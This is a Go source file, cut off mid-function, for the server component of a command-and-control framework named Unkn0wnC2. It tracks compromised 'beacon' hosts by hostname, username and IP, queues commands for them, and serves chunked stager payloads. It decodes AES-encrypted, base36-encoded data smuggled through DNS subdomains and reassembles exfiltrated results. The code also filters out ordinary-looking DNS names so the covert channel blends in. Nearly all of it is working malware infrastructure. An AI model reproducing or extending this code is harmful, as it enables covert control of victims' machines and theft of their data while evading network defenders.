// Package main implements the C2 management functionality for the Unkn0wnC2 server.
// This file handles beacon registration, task queuing, result collection, and
// the core C2 protocol logic including chunked data transmission.
package main

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Constants are now defined in constants.go

// Beacon represents a connected beacon client
type Beacon struct {
	ID          string    `json:"id"`
	Hostname    string    `json:"hostname"`
	Username    string    `json:"username"`
	OS          string    `json:"os"`
	Arch        string    `json:"arch"`
	FirstSeen   time.Time `json:"first_seen"`
	LastSeen    time.Time `json:"last_seen"`
	IPAddress   string    `json:"ip_address"`
	TaskQueue   []Task    `json:"-"`
	CurrentTask string    `json:"-"`
}

// Task represents a command task for a beacon
type Task struct {
	ID        string     `json:"id"`
	BeaconID  string     `json:"beacon_id"`
	Command   string     `json:"command"`
	Status    string     `json:"status"` // "pending", "sent", "completed", "failed"
	CreatedAt time.Time  `json:"created_at"`
	SentAt    *time.Time `json:"sent_at,omitempty"`
	Result    string     `json:"result,omitempty"`
}

// ResultChunk represents a piece of a multi-part result
type ResultChunk struct {
	BeaconID    string
	TaskID      string
	ChunkIndex  int
	TotalChunks int
	Data        string
	ReceivedAt  time.Time
}

// ExpectedResult tracks metadata for incoming chunked results
type ExpectedResult struct {
	BeaconID       string
	TaskID         string
	TotalSize      int
	TotalChunks    int
	ReceivedAt     time.Time
	ReceivedData   []string // Store chunks in order
	LastChunkIndex int      // Track last chunk received for progress calculation
}

// StagerSession tracks a stager deployment session
type StagerSession struct {
	ClientIP        string
	OS              string
	Arch            string
	Chunks          []string // Base64-encoded chunks
	TotalChunks     int
	CreatedAt       time.Time
	LastActivity    time.Time // Updated on each chunk request to prevent premature expiration
	StartedAt       time.Time // When first chunk was requested
	LastChunk       *int      // Last chunk index sent (pointer to differentiate nil from 0)
	ProgressRunning bool      // Track if progress updater is running
	ProgressDone    chan bool // Signal to stop progress updater
}

// C2Manager handles beacon management and tasking
type C2Manager struct {
	beacons              map[string]*Beacon
	tasks                map[string]*Task
	masterTaskIDs        map[string]string               // key: local taskID, value: master taskID
	resultChunks         map[string][]ResultChunk        // key: taskID (legacy)
	expectedResults      map[string]*ExpectedResult      // key: taskID (new two-phase)
	stagerSessions       map[string]*StagerSession       // key: clientIP
	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
	knownDomains         []string                        // Active DNS domains from Master (for first check-in)
	db                   *Database                       // Database for persistent storage
	resultBatchBuffer    map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
	mutex                sync.RWMutex
	taskCounter          int // Counter for local tasks (standalone mode)
	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
	debug                bool
	aesKey               []byte
	jitterConfig         StagerJitter // Stager timing configuration
	domain               string       // The domain this server is authoritative for
}

// CachedStagerSession tracks stager sessions created from cached data (no Master roundtrip)
type CachedStagerSession struct {
	SessionID       string
	MasterSessionID string // Session ID assigned by Master for UI tracking
	ClientBinaryID  string
	StagerIP        string
	TotalChunks     int
	ChunksServed    int
	SHA256Checksum  string // Checksum of original binary for verification
	CreatedAt       time.Time
	LastActivity    time.Time
}

// NewC2Manager creates a new C2 management instance with the specified configuration.
// It initializes the beacon tracking system, task management, sets up AES encryption,
// and initializes the database for persistent storage.
func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, dbPath string, domain string) *C2Manager {
	aesKey := generateAESKey(encryptionKey)

	// Initialize database
	db, err := NewDatabase(dbPath)
	if err != nil {
		logf("[DB] WARNING: Failed to initialize database: %v", err)
		logf("[DB] Running in memory-only mode (data will not persist)")
		db = nil
	}

	c2 := &C2Manager{
		beacons:              make(map[string]*Beacon),
		tasks:                make(map[string]*Task),
		masterTaskIDs:        make(map[string]string),
		resultChunks:         make(map[string][]ResultChunk),
		expectedResults:      make(map[string]*ExpectedResult),
		stagerSessions:       make(map[string]*StagerSession),
		cachedStagerSessions: make(map[string]*CachedStagerSession),
		recentMessages:       make(map[string]time.Time),
		resultBatchBuffer:    make(map[string][]ResultChunk),
		resultBatchTimer:     make(map[string]*time.Timer),
		db:                   db,
		taskCounter:          TaskCounterStart,
		debug:                debug,
		aesKey:               aesKey,
		jitterConfig:         jitterConfig,
		domain:               domain,
	}

	// Load existing beacons from database
	if c2.db != nil {
		if err := c2.loadBeaconsFromDB(); err != nil {
			logf("[DB] WARNING: Failed to load beacons from database: %v", err)
		}
		// Load existing tasks from database
		if err := c2.loadTasksFromDB(); err != nil {
			logf("[DB] WARNING: Failed to load tasks from database: %v", err)
		}
	}

	// Start cleanup goroutine
	go c2.cleanupExpiredSessions()

	// Start periodic database sync
	if c2.db != nil {
		go c2.periodicDBCleanup()
	}

	return c2
}

// loadBeaconsFromDB loads existing beacons from the database into memory
func (c2 *C2Manager) loadBeaconsFromDB() error {
	beacons, err := c2.db.GetAllBeacons()
	if err != nil {
		return fmt.Errorf("failed to load beacons: %w", err)
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	for _, beacon := range beacons {
		c2.beacons[beacon.ID] = beacon
		logf("[DB] Loaded beacon from database: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
	}

	if len(beacons) > 0 {
		logf("[DB] Loaded %d beacon(s) from database", len(beacons))
	}

	return nil
}

// loadTasksFromDB loads existing tasks from the database into memory
func (c2 *C2Manager) loadTasksFromDB() error {
	tasks, err := c2.db.GetAllTasks()
	if err != nil {
		return fmt.Errorf("failed to load tasks: %w", err)
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Load tasks and populate beacon task queues
	for _, task := range tasks {
		c2.tasks[task.ID] = task

		// Update task counter to avoid ID collisions
		if strings.HasPrefix(task.ID, "T") {
			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.taskCounter {
				c2.taskCounter = id + 1
			}
		}

		// Add pending tasks to beacon queues
		if task.Status == "pending" {
			if beacon, exists := c2.beacons[task.BeaconID]; exists {
				beacon.TaskQueue = append(beacon.TaskQueue, *task)
			}
		} else if task.Status == "sent" {
			// Restore "sent" tasks as current task (beacon may have crashed before completing)
			if beacon, exists := c2.beacons[task.BeaconID]; exists {
				beacon.CurrentTask = task.ID
			}
		}
	}

	if len(tasks) > 0 {
		logf("[DB] Loaded %d task(s) from database", len(tasks))
	}

	return nil
}

// periodicDBCleanup performs periodic database maintenance
func (c2 *C2Manager) periodicDBCleanup() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		if c2.db == nil {
			return
		}

		// Clean up old completed tasks (older than 30 days by default)
		if err := c2.db.CleanupOldData(30); err != nil {
			if c2.debug {
				logf("[DB] Database cleanup error: %v", err)
			}
		}

		// Log database stats in debug mode
		if c2.debug {
			if stats, err := c2.db.GetDatabaseStats(); err == nil {
				logf("[DB] DB Stats: %d beacons, %d active, %d tasks",
					stats["beacons"], stats["active_beacons"], stats["tasks"])
			}
		}
	}
}

// calculateStagerETA calculates ETA using overall transfer rate (including pauses)
// Returns a human-readable duration string (e.g., "2m 30s", "45s", "2d 5h")
func calculateStagerETA(session *StagerSession, currentChunk int) string {
	if currentChunk >= session.TotalChunks {
		return "complete"
	}

	// Need at least one chunk to calculate
	if currentChunk < 1 || session.StartedAt.IsZero() {
		return "calculating..."
	}

	chunksRemaining := session.TotalChunks - currentChunk

	// ALWAYS use overall average rate including ALL elapsed time (pauses + transfers)
	// This is the only way to get accurate ETA for operations with jitter pauses
	elapsed := time.Since(session.StartedAt).Seconds()
	overallRate := elapsed / float64(currentChunk) // seconds per chunk (includes everything)

	// Estimate remaining time: seconds_per_chunk * chunks_remaining
	estimatedSecondsRemaining := overallRate * float64(chunksRemaining)

	duration := time.Duration(estimatedSecondsRemaining) * time.Second

	// Format as human-readable string with support for days
	if duration < time.Minute {
		return fmt.Sprintf("%ds", int(duration.Seconds()))
	} else if duration < time.Hour {
		minutes := int(duration.Minutes())
		seconds := int(duration.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else if duration < 24*time.Hour {
		hours := int(duration.Hours())
		minutes := int(duration.Minutes()) % 60
		if minutes > 0 {
			return fmt.Sprintf("%dh %dm", hours, minutes)
		}
		return fmt.Sprintf("%dh", hours)
	} else {
		// Days and hours for long transfers
		days := int(duration.Hours()) / 24
		hours := int(duration.Hours()) % 24
		if hours > 0 {
			return fmt.Sprintf("%dd %dh", days, hours)
		}
		return fmt.Sprintf("%dd", days)
	}
}

// renderProgressBar creates a visual progress bar for stager downloads
// Returns a formatted string with progress bar, percentage, and ETA
//
//nolint:unused // Used by logStagerProgress
func renderProgressBar(current, total int, eta string, clientIP string) string {
	if total == 0 {
		return ""
	}

	percentage := float64(current) / float64(total) * 100
	barWidth := 40
	filled := int(float64(barWidth) * float64(current) / float64(total))

	// Build progress bar
	bar := "["
	for i := 0; i < barWidth; i++ {
		if i < filled {
			bar += "="
		} else if i == filled && filled < barWidth {
			bar += ">"
		} else {
			bar += " "
		}
	}
	bar += "]"

	// Format: [=========>           ] 25% (10/40 chunks) ETA: 2m 30s - 192.168.1.100
	return fmt.Sprintf("\r[Stager] %s %.1f%% (%d/%d chunks) ETA: %s - %s",
		bar, percentage, current, total, eta, clientIP)
}

// startProgressUpdater starts a goroutine that continuously updates the progress bar
func (c2 *C2Manager) startProgressUpdater(session *StagerSession, clientIP string) {
	if session.ProgressRunning {
		return // Already running
	}

	session.ProgressRunning = true
	session.ProgressDone = make(chan bool)

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-session.ProgressDone:
				return
			case <-ticker.C:
				c2.mutex.RLock()
				if session.LastChunk == nil {
					c2.mutex.RUnlock()
					continue
				}
				current := *session.LastChunk + 1
				if current >= session.TotalChunks {
					c2.mutex.RUnlock()
					return
				}

				eta := calculateStagerETA(session, current)
				progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)
				fmt.Print(progressBar)
				c2.mutex.RUnlock()
			}
		}
	}()
}

// stopProgressUpdater stops the progress updater goroutine
func (c2 *C2Manager) stopProgressUpdater(session *StagerSession) {
	if session.ProgressRunning && session.ProgressDone != nil {
		close(session.ProgressDone)
		session.ProgressRunning = false
	}
}

// logStagerProgress displays or updates the progress bar for stager downloads
func (c2 *C2Manager) logStagerProgress(session *StagerSession, chunkIndex int, clientIP string) {
	current := chunkIndex + 1
	eta := calculateStagerETA(session, current)

	progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)

	// If this is the first chunk, print on new line and start progress updater
	if chunkIndex == 0 {
		fmt.Print("\n" + progressBar)
		c2.startProgressUpdater(session, clientIP)
	} else if current == session.TotalChunks {
		// Final chunk - stop updater and print completion
		c2.stopProgressUpdater(session)
		elapsed := time.Since(session.StartedAt)
		fmt.Printf("\r[Stager] %s %.1f%% (%d/%d chunks) Complete in %s - %s\n",
			"[========================================]", 100.0, session.TotalChunks, session.TotalChunks,
			formatDuration(elapsed), clientIP)
	} else {
		// Chunk received - the updater will continue showing progress
		fmt.Print(progressBar)
	}
}

// formatDuration formats a duration into human-readable format
//
//nolint:unused // Used by logStagerProgress
func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	} else if d < time.Hour {
		minutes := int(d.Minutes())
		seconds := int(d.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else {
		hours := int(d.Hours())
		minutes := int(d.Minutes()) % 60
		return fmt.Sprintf("%dh %dm", hours, minutes)
	}
}

// cleanupExpiredSessions periodically removes expired stager sessions and expected results
func (c2 *C2Manager) cleanupExpiredSessions() {
	ticker := time.NewTicker(CleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()

		// Clean up old message hashes (keep only last 5 minutes)
		c2.mutex.Lock()
		expiredCount := 0
		for msgHash, timestamp := range c2.recentMessages {
			if now.Sub(timestamp) > 5*time.Minute {
				delete(c2.recentMessages, msgHash)
				expiredCount++
			}
		}
		c2.mutex.Unlock()
		if c2.debug && expiredCount > 0 {
			logf("[C2] Cleaned up %d expired message hashes", expiredCount)
		}

		// Clean up expired stager sessions (collect IPs first to avoid iteration issues)
		c2.mutex.Lock()
		var expiredSessionIPs []string
		for ip, session := range c2.stagerSessions {
			if now.Sub(session.LastActivity) > StagerSessionTimeout {
				expiredSessionIPs = append(expiredSessionIPs, ip)
			}
		}
		c2.mutex.Unlock()

		// Now safely stop progress updaters and delete sessions (outside lock)
		for _, ip := range expiredSessionIPs {
			c2.mutex.Lock()
			if session, exists := c2.stagerSessions[ip]; exists {
				c2.stopProgressUpdater(session)
				delete(c2.stagerSessions, ip)
				if c2.debug {
					logf("[C2] Cleaned up expired stager session for %s (inactive for %v)", ip, now.Sub(session.LastActivity))
				}
			}
			c2.mutex.Unlock()
		}

		// Clean up expired expected results, but save partial results first
		// Collect expired results first (with lock)
		type expiredResult struct {
			taskID      string
			beaconID    string
			data        []string
			recvCount   int
			totalChunks int
		}
		var expiredResults []expiredResult

		c2.mutex.Lock()
		for taskID, expected := range c2.expectedResults {
			if now.Sub(expected.ReceivedAt) > ExpectedResultTimeout {
				// Count received chunks
				receivedCount := 0
				for i := 0; i < expected.TotalChunks; i++ {
					if expected.ReceivedData[i] != "" {
						receivedCount++
					}
				}

				// Collect data for processing outside lock
				if receivedCount > 0 {
					expiredResults = append(expiredResults, expiredResult{
						taskID:      taskID,
						beaconID:    expected.BeaconID,
						data:        expected.ReceivedData,
						recvCount:   receivedCount,
						totalChunks: expected.TotalChunks,
					})
				}

				delete(c2.expectedResults, taskID)
			}
		}

		// Clean up recent message hashes older than RecentMessageTTL
		for msgHash, timestamp := range c2.recentMessages {
			if now.Sub(timestamp) > RecentMessageTTL {
				delete(c2.recentMessages, msgHash)
			}
		}
		c2.mutex.Unlock()

		// Process expired results outside the lock
		for _, expired := range expiredResults {
			partialResult := strings.Join(expired.data, "")
			logf("[C2] Task %s timed out with %d/%d chunks - saving partial result (%d bytes)",
				expired.taskID, expired.recvCount, expired.totalChunks, len(partialResult))

			// Update task status and save partial result
			c2.mutex.Lock()
			if task, exists := c2.tasks[expired.taskID]; exists {
				task.Result = partialResult
				task.Status = "partial"
			}
			c2.mutex.Unlock()

			// Save to database asynchronously (outside lock)
			if c2.db != nil {
				go func(tid, bid, res string) {
					if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
						logf("[C2] Failed to save partial result: %v", err)
					}
					// Mark as partial in database
					if err := c2.db.UpdateTaskStatus(tid, "partial"); err != nil && c2.debug {
						logf("[C2] Failed to update task status: %v", err)
					}
				}(expired.taskID, expired.beaconID, partialResult)
			}
		}
	}
}

// GetEncryptionKey returns the AES encryption key for external use
func (c2 *C2Manager) GetEncryptionKey() []byte {
	return c2.aesKey
}

// isPrintableASCII checks if a string contains only printable ASCII characters
// Used to validate that decrypted data is likely valid C2 traffic
func isPrintableASCII(s string) bool {
	for _, r := range s {
		// Allow printable ASCII (space to ~) plus newlines/tabs
		if r < 32 && r != 9 && r != 10 && r != 13 || r > 126 {
			return false
		}
	}
	return true
}

// decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
	// Remove dots from DNS labels (e.g., "abc.def" -> "abcdef")
	// This handles long subdomains that get split into multiple labels
	encoded = strings.ReplaceAll(encoded, ".", "")

	// Use new base36 + AES-GCM decoding
	decoded, err := decodeAndDecrypt(encoded, c2.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt: %v", err)
	}

	return decoded, nil
}

// isLegitimateSubdomain determines if a DNS subdomain represents legitimate traffic
// rather than encoded C2 communications based on pattern analysis.
func isLegitimateSubdomain(subdomain string) bool {
	// Convert to lowercase for comparison
	lower := strings.ToLower(subdomain)

	// Common legitimate subdomains
	legitimate := []string{
		"ns1", "ns2", "ns3", "ns4",
		"www", "mail", "mx", "mx1", "mx2",
		"ftp", "smtp", "pop", "imap",
		"api", "cdn", "static", "img", "images",
		"blog", "shop", "store", "admin",
		"test", "dev", "staging", "beta",
	}

	for _, legit := range legitimate {
		if lower == legit {
			return true
		}
	}

	// If subdomain is very short (likely legitimate)
	if len(subdomain) <= 4 {
		return true
	}

	// If subdomain contains only letters and numbers with dashes (no base36-like pattern)
	// and is reasonably short, it's probably legitimate
	if len(subdomain) <= LegitimateSubdomainMaxLength && !looksLikeBase36(subdomain) {
		return true
	}

	return false
}

// looksLikeBase36 analyzes a string to determine if it appears to be Base36-encoded data
// based on length, character distribution, and entropy characteristics.
func looksLikeBase36(s string) bool {
	// Remove any dots (from split labels)
	clean := strings.ReplaceAll(s, ".", "")

	// Must be reasonably long to be encoded data (base36 encoded AES-GCM data is typically long)
	if len(clean) < Base36MinLength {
		return false
	}

	// Check if all characters are valid base36 digits (0-9, a-z)
	for _, char := range clean {
		if !((char >= '0' && char <= '9') ||
			(char >= 'a' && char <= 'z')) {
			return false
		}
	}

	// Additional heuristics for base36 encoded data:
	// - Very long strings are likely encoded data
	// - High entropy (good mix of numbers and letters) suggests encoding
	if len(clean) > Base36LongStringThreshold {
		return true
	}

	// Check for good entropy (mix of numbers and letters)
	hasNumbers := false
	hasLetters := false
	for _, char := range clean {
		if char >= '0' && char <= '9' {
			hasNumbers = true
		}
		if char >= 'a' && char <= 'z' {
			hasLetters = true
		}
		if hasNumbers && hasLetters {
			break
		}
	}

	// If it has both numbers and letters and is reasonably long, it's likely base36 data
	return hasNumbers && hasLetters && len(clean) >= Base36MinLength
}

// processBeaconQuery processes a DNS query from a beacon and returns appropriate response
func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, bool) {
	// NOTE: No mutex lock here - individual handler functions manage their own locks
	// to prevent deadlock when handlers call other functions that also need locks

	// In distributed mode, we need to handle queries for any C2 domain, not just our own
	// Extract subdomain by finding the last two labels (assumed to be the domain)
	// Example: "base36data.timestamp.secwolf.net" -> subdomain = "base36data.timestamp"

	parts := strings.Split(qname, ".")
	if len(parts) < 3 {
		// Need at least subdomain.domain.tld
		return "", false
	}

	// Assume last 2 parts are domain.tld (e.g., "secwolf.net" or "errantshield.com")
	subdomain := strings.Join(parts[:len(parts)-2], ".")
	if len(subdomain) == 0 {
		return "", false
	}

	// Skip legitimate DNS names (NS, MX, WWW, etc.) - check before processing
	firstLabel := subdomain
	if dotPos := strings.Index(subdomain, "."); dotPos != -1 {
		firstLabel = subdomain[:dotPos]
	}
	if isLegitimateSubdomain(firstLabel) {
		return "", false
	}

	// Both client and stager add timestamps for DNS cache busting
	// Format: base36_data_labels.timestamp.domain OR base36_label1.base36_label2.timestamp.domain
	// The timestamp is numeric (unix timestamp, 10 digits) and should be removed before decoding

	// Split subdomain into labels
	labels := strings.Split(subdomain, ".")

	// Check if last label is a timestamp (10-digit numeric string)
	var encodedLabels []string
	if len(labels) > 1 {
		lastLabel := labels[len(labels)-1]
		// Check if it's a unix timestamp (10-11 digits, all numeric)
		if len(lastLabel) >= 10 && len(lastLabel) <= 11 {
			isNumeric := true
			for _, c := range lastLabel {
				if c < '0' || c > '9' {
					isNumeric = false
					break
				}
			}
			if isNumeric {
				// Last label is a timestamp, remove it
				encodedLabels = labels[:len(labels)-1]
			} else {
				// Not a timestamp, keep all labels
				encodedLabels = labels
			}
		} else {
			// Last label isn't timestamp length, keep all labels
			encodedLabels = labels
		}
	} else {
		encodedLabels = labels
	}

	// Join all non-timestamp labels to reconstruct the base36 encoded message
	encodedMessage := strings.Join(encodedLabels, "")

	// Check if this looks like Base36-encoded data before trying to decode
	// This prevents attempting to decrypt random DNS queries
	if !looksLikeBase36(encodedMessage) {
		if c2.debug {
			logf("[DEBUG] Subdomain doesn't look like Base36 data, skipping: %s", subdomain)
		}
		return "", false
	}

	if c2.debug {
		logf("[DEBUG] Processing subdomain: %s, extracted message: %s (removed timestamp: %v)",
			subdomain, encodedMessage, len(encodedLabels) != len(labels))
		logf("[DEBUG] isLikelyBase36=%v, len=%d",
			looksLikeBase36(encodedMessage), len(encodedMessage))
	}

	// Try decrypting as encrypted beacon data first (normal client traffic)
	decoded, err := c2.decodeBeaconData(encodedMessage)

	// If decryption fails, try base36 decode without encryption (stager traffic)
	if err != nil {
		if c2.debug {
			logf("[DEBUG] AES-GCM decryption failed, trying plain base36 decode for stager")
		}
		decoded, err = base36DecodeString(encodedMessage)
		if err != nil {
			if c2.debug {
				logf("[DEBUG] Base36 decode also failed: %v", err)
			}
			return "", false
		}
		if c2.debug {
			logf("[DEBUG] Plain base36 decoded (stager): %s", decoded)
		}
	} else {
		if c2.debug {
			logf("[DEBUG] AES-GCM decrypted (client): %s", decoded)
		}
	}

	// Strip timestamp from decoded data (cache busting)
	// Format: COMMAND|data|...|timestamp -> COMMAND|data|...
	timestampParts := strings.Split(decoded, "|")
	if len(timestampParts) > 1 {
		// Check if last part is a timestamp (numeric)
		lastPart := timestampParts[len(timestampParts)-1]
		if len(lastPart) >= UnixTimestampMinLength && len(lastPart) <= UnixTimestampMaxLength { // Unix timestamp length
			if _, err := strconv.ParseInt(lastPart, 10, 64); err == nil {
				// Remove timestamp
				decoded = strings.Join(timestampParts[:len(timestampParts)-1], "|")
			}
		}
	}

	// Determine message type and split into parts appropriately so the result/data
	// payloads (which may contain '|' characters) are preserved in the last part.
	if len(decoded) == 0 {
		return "", false
	}

	// Validate that decoded data contains printable characters (sanity check)
	// If decryption produced garbage, don't log it
	if !isPrintableASCII(decoded) {
		if c2.debug {
			logf("[DEBUG] Decoded data contains non-printable characters, likely not C2 traffic")
		}
		return "", false
	}

	// Check for duplicate messages (DNS retries) - hash the content for logging only
	msgHash := fmt.Sprintf("%x", sha256.Sum256([]byte(decoded)))
	isDuplicate := false

	// Extract message type FIRST
	messageType := strings.SplitN(decoded, "|", 2)[0]

	c2.mutex.Lock()
	if lastSeen, exists := c2.recentMessages[msgHash]; exists {
		isDuplicate = true
		c2.mutex.Unlock()
		if c2.debug {
			logf("[DEBUG] Duplicate message detected (seen %v ago), processing anyway", time.Since(lastSeen))
		}
	} else {
		// Mark new message as seen
		c2.recentMessages[msgHash] = time.Now()
		c2.mutex.Unlock()
	}
	var response string
	var validMessage bool

	switch messageType {
	case "STG": // Stager request
		parts := strings.SplitN(decoded, "|", 4) // STG|IP|OS|ARCH
		if len(parts) < 4 {
			return "", false
		}
		response = c2.handleStagerRequest(parts, clientIP, isDuplicate)
		validMessage = true

	case "ACK": // DEPRECATED: Old stager acknowledgment protocol
		parts := strings.SplitN(decoded, "|", 4) // ACK|chunk_index|IP|session
		if len(parts) < 2 {
			return "", false
		}
		response = c2.handleStagerAck(parts, clientIP, isDuplicate)
		validMessage = true

	case "CHUNK": // Stager chunk request (new protocol) OR legacy client chunking
		parts := strings.SplitN(decoded, "|", 6)
		if len(parts) == 4 {
			// New stager protocol: CHUNK|index|IP|sessionID
			// Use sessionless architecture - serve chunks regardless of session sync state
			chunkIndex, _ := strconv.Atoi(parts[1])
			stagerIP := parts[2]
			sessionID := parts[3]

			// If Master mode, use new sessionless handler
			if masterClient != nil {
				response = c2.handleStagerChunkRequestNew(chunkIndex, stagerIP, sessionID, masterClient, isDuplicate)
			} else {
				// Standalone mode - use old handler
				response = c2.handleStagerAck(parts, clientIP, isDuplicate)
			}
			validMessage = true
		} else if len(parts) >= 6 {
			// Legacy client chunking protocol
			response = c2.handleChunk(parts)
			validMessage = true
		} else {
			return "", false
		}

	case "CHECKIN", "CHK":
		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
		if len(parts) < 5 {
			return "", false
		}
		// Don't treat checkins as duplicates - task queues are dynamic
		// Always process checkin to check for new tasks
		response = c2.handleCheckin(parts, clientIP, false)
		validMessage = true

	case "RESULT":
		// RESULT|beaconID|taskID|<entire result...>
		parts := strings.SplitN(decoded, "|", 4)
		if len(parts) < 4 {
			return "", false
		}
		response = c2.handleResult(parts, isDuplicate)
		validMessage = true

	case "RESULT_META":
		parts := strings.SplitN(decoded, "|", 5) // RESULT_META|id|task|size|chunks
		if len(parts) < 5 {
			return "", false
		}
		response = c2.handleResultMeta(parts, isDuplicate)
		validMessage = true

	case "DATA":
		// DATA|id|taskID|index|<chunk...>
		parts := strings.SplitN(decoded, "|", 5)
		if len(parts) < 5 {
			return "", false
		}
		response = c2.handleData(parts, isDuplicate)
		validMessage = true

	default:
		// Only log if debug mode (reduces noise from random DNS queries)
		if c2.debug {
			logf("[DEBUG] Unknown message type: %s", messageType)
		}
		return "", false
	}

	return response, validMessage
}

// handleCheckin processes a beacon check-in
func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate bool) string {
	if len(parts) < 5 {
		return "ERROR"
	}

	beaconID := parts[1]
	hostname := parts[2]
	username := parts[3]
	os := parts[4]
	arch := "unknown"
	if len(parts) >= 6 {
		arch = parts[5] // Architecture now included in client check-in
	}

	// Update or create beacon (with mutex protection)
	c2.mutex.Lock()
	beacon, exists := c2.beacons[beaconID]
	if !exists {
		now := time.Now()
		beacon = &Beacon{
			ID:        beaconID,
			Hostname:  hostname,
			Username:  username,
			OS:        os,
			Arch:      arch,
			FirstSeen: now,
			LastSeen:  now,
			IPAddress: clientIP,
			TaskQueue: []Task{},
		}
		c2.beacons[beaconID] = beacon

		// SHADOW MESH: Queue any pending tasks that were synced from Master before beacon arrived
		// This handles the case where tasks are created on DNS Server A, but beacon checks into DNS Server B first
		for _, task := range c2.tasks {
			if task.BeaconID == beaconID && task.Status == "pending" {
				beacon.TaskQueue = append(beacon.TaskQueue, *task)
				if c2.debug {
					logf("[C2] Queued pending task %s for newly registered beacon %s", task.ID, beaconID)
				}
			}
		}

		c2.mutex.Unlock()
		// Always log new beacon registration (even if duplicate DNS query)
		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)

		// Report new beacon to Master Server (if in distributed mode)
		if masterClient != nil {
			go func() {
				// Use goroutine to avoid blocking DNS response
				if err := masterClient.ReportBeacon(beacon); err != nil {
					if c2.debug {
						logf("[C2] Failed to report beacon to master: %v", err)
					}
				}
			}()
		}
	} else {
		// Update beacon info for existing beacon
		beacon.Hostname = hostname
		beacon.Username = username
		beacon.OS = os
		beacon.Arch = arch
		beacon.LastSeen = time.Now()
		beacon.IPAddress = clientIP
		c2.mutex.Unlock()
	}

	// Update beacon in master if it already existed (periodic check-in)
	if exists && masterClient != nil {
		go func() {
			if err := masterClient.ReportBeacon(beacon); err != nil {
				if c2.debug {
					logf("[C2] Failed to update beacon on master: %v", err)
				}
			}
		}()
	}

	// Create a copy for async DB save (to avoid race conditions)
	beaconCopy := &Beacon{
		ID:        beacon.ID,
		Hostname:  beacon.Hostname,
		Username:  beacon.Username,
		OS:        beacon.OS,
		Arch:      beacon.Arch,
		FirstSeen: beacon.FirstSeen,
		LastSeen:  beacon.LastSeen,
		IPAddress: beacon.IPAddress,
	}

	// Save beacon to database (async to avoid blocking)
	if c2.db != nil && !isDuplicate {
		go func(b *Beacon) {
			if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
				logf("[C2] Failed to save beacon to database: %v", err)
			}
		}(beaconCopy)
	}

	// Only log checkins in debug mode and skip duplicates
	if c2.debug && !isDuplicate {
		logf("[C2] Checkin: %s (%s@%s) from %s",
			beaconID, username, hostname, clientIP)
	}

	// Check if there are pending tasks for this beacon (with mutex protection)
	c2.mutex.Lock()

	// If beacon has a current task assigned, check if it's been completed or failed
	if beacon.CurrentTask != "" {
		if task, exists := c2.tasks[beacon.CurrentTask]; exists {
			// If task is completed/failed/partial, clear it and allow next task
			if task.Status == "completed" || task.Status == "failed" || task.Status == "partial" {
				beacon.CurrentTask = ""
				if c2.debug {
					logf("[DEBUG] Cleared completed task %s from beacon %s CurrentTask", task.ID, beaconID)
				}
			} else if task.Status == "exfiltrating" {
				// Task is being exfiltrated - check if we're still actively receiving chunks
				// If the ExpectedResult is stale (>2 minutes old), clear CurrentTask and allow next task
				expected, hasExpectation := c2.expectedResults[task.ID]

				if hasExpectation && time.Since(expected.ReceivedAt) < 2*time.Minute {
					// Still actively receiving chunks - DO NOT re-send or clear
					// But check Master to see if task was completed (reassembly finished)
					c2.mutex.Unlock()

					if masterClient != nil {
						// Get master task ID if we have a mapping
						c2.mutex.RLock()
						masterTaskID, hasMasterID := c2.masterTaskIDs[task.ID]
						c2.mutex.RUnlock()

						checkTaskID := task.ID
						if hasMasterID {
							checkTaskID = masterTaskID
						}

						// Quick check if Master completed the task
						if masterStatus, err := masterClient.GetTaskStatus(checkTaskID); err == nil {
							if masterStatus == "completed" || masterStatus == "failed" || masterStatus == "partial" {
								// Task completed on Master - update local status and clear
								c2.mutex.Lock()
								if storedTask, exists := c2.tasks[task.ID]; exists {
									storedTask.Status = masterStatus
								}
								beacon.CurrentTask = ""
								delete(c2.expectedResults, task.ID)
								c2.mutex.Unlock()

								if c2.debug && !isDuplicate {
									logf("[DEBUG] Task %s completed on Master (status: %s), cleared from beacon %s during exfiltration check", task.ID, masterStatus, beaconID)
								}
								return "ACK"
							}
						}
					}

					// Still exfiltrating - don't give new task
					if c2.debug && !isDuplicate {
						logf("[DEBUG] Beacon %s is actively exfiltrating task %s, returning ACK", beaconID, task.ID)
					}
					return "ACK"
				} else {
					// Exfiltration stalled or beacon finished - clear CurrentTask and proceed to queue
					beacon.CurrentTask = ""
					if c2.debug {
